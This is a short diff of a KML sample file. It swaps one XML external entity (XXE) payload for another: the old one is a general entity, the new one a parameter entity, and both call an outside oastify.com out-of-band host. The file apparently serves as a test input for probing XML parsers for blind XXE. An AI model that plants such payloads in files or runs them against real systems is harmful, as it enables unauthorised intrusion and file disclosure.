@@ -1,8 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://hvgl78hta1pln9q88kfgfnzuoluci26r.oastify.com"> ]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://3y27aukfdns7qvtub6i2i92gr7xyl29r.oastify.com"> %xxe;]>
 <kml xmlns="http://www.opengis.net/kml/2.2">
   <Document>
-    <name>&xxe;</name>
     <name>KML Samples</name>
     <open>1</open>
     <description>Unleash your creativity with the help of these examples!</description>
